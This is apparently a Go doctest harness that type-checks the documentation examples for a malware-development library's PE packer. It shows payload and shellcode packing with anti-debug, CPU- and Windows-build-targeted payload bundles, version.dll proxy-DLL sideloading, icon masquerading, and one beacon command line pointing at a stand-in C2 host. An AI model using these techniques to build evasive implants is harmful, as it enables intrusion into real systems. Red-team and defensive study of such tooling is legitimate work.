// Doctest harness for docs/techniques/pe/packer.md. Every Go code
// block in the user-facing tech md must compile against the actual
// API. This file is the canonical reference — if a packer.md
// example fails to compile here, the doc has drifted from reality.
//
// Run with:
//
//	go vet ./pe/packer/
//	go build ./pe/packer/    # also catches type mismatches
//
// All snippets are wrapped in `func _()` (anonymous functions) so
// they don't link conflict; the goal is type-check, not run.

//go:build doctest_packer_md

package packer_test

import (
	"bytes"
	"image"
	"image/color"
	"os"

	"github.com/oioio-space/maldev/pe/dllproxy"
	"github.com/oioio-space/maldev/pe/packer"
	"github.com/tc-hib/winres"
)

// --- Mode 1 — Pack / Unpack ---
func _docModeOne() {
	var payload []byte
	blob, key, err := packer.Pack(payload, packer.Options{})
	_, _, _ = blob, key, err
	recovered, err := packer.Unpack(blob, key)
	_, _ = recovered, err
}

// --- Mode 2 — PackPipeline / UnpackPipeline ---
func _docModeTwo() {
	var payload []byte
	pipeline := []packer.PipelineStep{
		{Op: packer.OpCompress, Algo: uint8(packer.CompressorFlate)},
		{Op: packer.OpCipher, Algo: uint8(packer.CipherAESGCM)},
	}
	blob, keys, err := packer.PackPipeline(payload, pipeline)
	_, _, _ = blob, keys, err
	recovered, err := packer.UnpackPipeline(blob, keys)
	_, _ = recovered, err
}

// --- Mode 3 — PackBinary single-target ---
func _docModeThree() {
	var input []byte
	packed, _, err := packer.PackBinary(input, packer.PackBinaryOptions{
		Format:       packer.FormatWindowsExe,
		Stage1Rounds: 3,
		Seed:         0,
		Compress:     true,
		AntiDebug:    true,
		RandomizeAll: true,
	})
	_, _ = packed, err
}

// --- Mode 4 — PackBinaryBundle Go-runtime launcher ---
// The richer Quick-start example demonstrating fingerprint
// predicates + per-build profile derivation.
func _docModeFour() {
	intel := [12]byte{'G', 'e', 'n', 'u', 'i', 'n', 'e', 'I', 'n', 't', 'e', 'l'}
	amd := [12]byte{'A', 'u', 't', 'h', 'e', 'n', 't', 'i', 'c', 'A', 'M', 'D'}
	var w11Payload, w10Payload, fallbackPayload []byte

	profile := packer.DeriveBundleProfile([]byte("ops-2026-05-09-target-A"))

	bundle, err := packer.PackBinaryBundle(
		[]packer.BundlePayload{
			{Binary: w11Payload, Fingerprint: packer.FingerprintPredicate{
				PredicateType: packer.PTCPUIDVendor | packer.PTWinBuild,
				VendorString:  intel,
				BuildMin:      22000, BuildMax: 99999,
			}},
			{Binary: w10Payload, Fingerprint: packer.FingerprintPredicate{
				PredicateType: packer.PTCPUIDVendor | packer.PTWinBuild,
				VendorString:  amd,
				BuildMin:      10000, BuildMax: 19999,
			}},
			{Binary: fallbackPayload, Fingerprint: packer.FingerprintPredicate{
				PredicateType: packer.PTMatchAll,
			}},
		},
		packer.BundleOptions{Profile: profile},
	)
	_, _ = bundle, err
}

// --- Mode 5 — PackBinaryBundle + WrapBundleAsExecutableLinux ---
func _docModeFive() {
	bundle, _ := packer.PackBinaryBundle([]packer.BundlePayload{},
		packer.BundleOptions{})
	exe, err := packer.WrapBundleAsExecutableWindows(bundle)
	_, _ = exe, err
	out, err := packer.WrapBundleAsExecutableLinux(bundle)
	_, _ = out, err
}

// --- Mode 6 — PackShellcode ---
func _docModeSix() {
	var sc []byte
	exe, _, err := packer.PackShellcode(sc, packer.PackShellcodeOptions{
		Format: packer.FormatWindowsExe,
	})
	_, _ = exe, err
	exe, key, err := packer.PackShellcode(sc, packer.PackShellcodeOptions{
		Format:  packer.FormatLinuxELF,
		Encrypt: true,
	})
	_, _, _ = exe, key, err
}

// --- Mode 7 — FormatWindowsDLL ---
func _docModeSeven() {
	var input []byte
	out, _, err := packer.PackBinary(input, packer.PackBinaryOptions{
		Format:       packer.FormatWindowsDLL,
		Stage1Rounds: 3,
		Seed:         0,
		AntiDebug:    true,
		RandomizeAll: true,
	})
	_, _ = out, err
}

// --- Mode 8 — ConvertEXEtoDLL ---
func _docModeEight() {
	var exe []byte
	out, _, err := packer.PackBinary(exe, packer.PackBinaryOptions{
		Format:          packer.FormatWindowsExe,
		ConvertEXEtoDLL: true,
		Stage1Rounds:    3,
		Seed:            0,
		Compress:        true,
		AntiDebug:       true,
		RandomizeAll:    true,
	})
	_, _ = out, err
}

// --- Mode 8 with operator-controlled cmdline (v0.130.0+) ---
func _docModeEightDefaultArgs() {
	var exe []byte
	out, _, err := packer.PackBinary(exe, packer.PackBinaryOptions{
		Format:                     packer.FormatWindowsExe,
		ConvertEXEtoDLL:            true,
		ConvertEXEtoDLLDefaultArgs: "agent.exe --beacon https://c2.example/cb --jitter 30",
		Stage1Rounds:               3,
		Seed:                       0,
	})
	_, _ = out, err
}

// --- Mode 9 — PackChainedProxyDLL ---
func _docModeNine() {
	var exe []byte
	proxy, payload, _, err := packer.PackChainedProxyDLL(exe,
		packer.ChainedProxyDLLOptions{
			TargetName: "version",
			Exports: []dllproxy.Export{
				{Name: "GetFileVersionInfoSizeW"},
				{Name: "GetFileVersionInfoW"},
				{Name: "VerQueryValueW"},
			},
			PayloadDLLName: "payload.dll",
			PackOpts: packer.PackBinaryOptions{
				Format:       packer.FormatWindowsExe,
				Stage1Rounds: 3,
				Seed:         0,
			},
		})
	_, _, _ = proxy, payload, err
	_ = os.WriteFile("/dropdir/version.dll", proxy, 0o644)
	_ = os.WriteFile("/dropdir/payload.dll", payload, 0o644)
}

// --- Mode 10 — PackProxyDLL ---
func _docModeTen() {
	var exe []byte
	fused, _, err := packer.PackProxyDLL(exe, packer.ProxyDLLOptions{
		TargetName: "version",
		Exports: []dllproxy.Export{
			{Name: "GetFileVersionInfoSizeW"},
			{Name: "GetFileVersionInfoW"},
			{Name: "VerQueryValueW"},
		},
		PackOpts: packer.PackBinaryOptions{
			Format:       packer.FormatWindowsExe,
			Stage1Rounds: 3,
			Seed:         0,
		},
	})
	_, _ = fused, err
	_ = os.WriteFile("/dropdir/version.dll", fused, 0o644)
}

// --- Composability — pe/masquerade resource transplant ---
func _docMasqueradeCompose() {
	src, _ := os.ReadFile("source.dll")
	rs, _ := winres.LoadFromEXE(bytes.NewReader(src))
	img := image.NewRGBA(image.Rect(0, 0, 16, 16))
	img.Set(0, 0, color.RGBA{R: 255, A: 255})
	icon, _ := winres.NewIconFromImages([]image.Image{img})
	_ = rs.SetIconTranslation(winres.Name("MAINICON"), 0x0409, icon)
	out, _ := os.Create("dst.dll")
	_ = rs.WriteToEXE(out, bytes.NewReader(src))
}
